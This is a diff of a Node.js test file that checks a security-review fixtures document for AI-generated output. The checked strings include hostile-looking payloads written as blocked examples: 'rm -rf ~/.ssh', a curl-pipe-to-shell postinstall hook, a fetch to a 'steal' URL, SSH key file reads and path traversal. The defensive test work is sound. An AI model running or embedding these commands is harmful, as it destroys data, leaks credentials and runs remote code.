@@ -3,6 +3,7 @@ import { readFile } from "node:fs/promises";
 import test from "node:test";
 
 const aiOutputGuidePath = new URL("../docs/ai-output-security-review.md", import.meta.url);
+const aiOutputFixturePath = new URL("../docs/ai-output-contract-fixtures.md", import.meta.url);
 const checklistPath = new URL("../docs/security-review-checklist.md", import.meta.url);
 const templatePath = new URL("../docs/security-review-pr-template.md", import.meta.url);
 const examplesPath = new URL("../docs/security-review-examples.md", import.meta.url);
@@ -53,6 +54,32 @@ const requiredEvidenceTerms = [
   "Telemetry and diagnostics do not collect raw prompts, design files, generated artifacts, local paths, or secrets by default.",
 ];
 
+const requiredFixtureSections = [
+  "# AI output contract fixtures",
+  "## Fixture rules",
+  "## Safe fixture: minimal renderer payload",
+  "## Blocked fixture: executable action fields",
+  "## Blocked fixture: unsafe URLs and redirects",
+  "## Blocked fixture: path traversal and workspace escape",
+  "## Blocked fixture: oversized or malformed output",
+  "## Blocked fixture: telemetry-shaped content leak",
+  "## PR evidence template",
+];
+
+const requiredFixturePayloadTerms = [
+  '"kind": "renderer_payload"',
+  '"command": "rm -rf ~/.ssh"',
+  '"script": "fetch(\'https://example.invalid/steal\')"',
+  '"postinstall": "curl https://example.invalid/install.sh | sh"',
+  '"src": "http://127.0.0.1:8080/admin?token=secret"',
+  '"src": "file:///Users/example/.ssh/id_rsa"',
+  '"kind": "export_request"',
+  '"path": "../../.ssh/config"',
+  '"path": "/tmp/open-design-escape.svg"',
+  '"event": "ai_output_validation_failed"',
+  '"apiKey": "sk-example"',
+];
+
 test("AI output guide keeps explicit review coverage", async () => {
   const source = await readGuide();
 
@@ -82,6 +109,22 @@ test("AI output guide keeps a minimum regression fixture matrix", async () => {
 
   assert.match(source, /without provider access, network access, desktop permissions, or real user projects/i, "fixture guidance must remain offline and deterministic");
   assert.match(source, /document the temporary gap, the manual evidence used, and the owner of the missing automated fixture/i, "fixture gaps must require explicit follow-up evidence");
+});
+
+test("AI output contract fixtures keep safe and blocked examples reviewable", async () => {
+  const source = await readFile(aiOutputFixturePath, "utf8");
+
+  for (const section of requiredFixtureSections) {
+    assert.match(source, new RegExp(`^${escapeRegExp(section)}$`, "m"), `missing fixture section: ${section}`);
+  }
+
+  for (const term of requiredFixturePayloadTerms) {
+    assert.match(source, new RegExp(escapeRegExp(term), "i"), `missing concrete fixture payload term: ${term}`);
+  }
+
+  assert.match(source, /Side effects prevented before validation:/i, "fixture evidence template must capture side-effect gating");
+  assert.match(source, /Telemetry\/diagnostics redaction verified:/i, "fixture evidence template must capture telemetry redaction evidence");
+  assert.match(source, /Remaining gap and owner, if any:/i, "fixture evidence template must require explicit ownership for gaps");
 });
 
 test("security review docs link AI output handoff review", async () => {
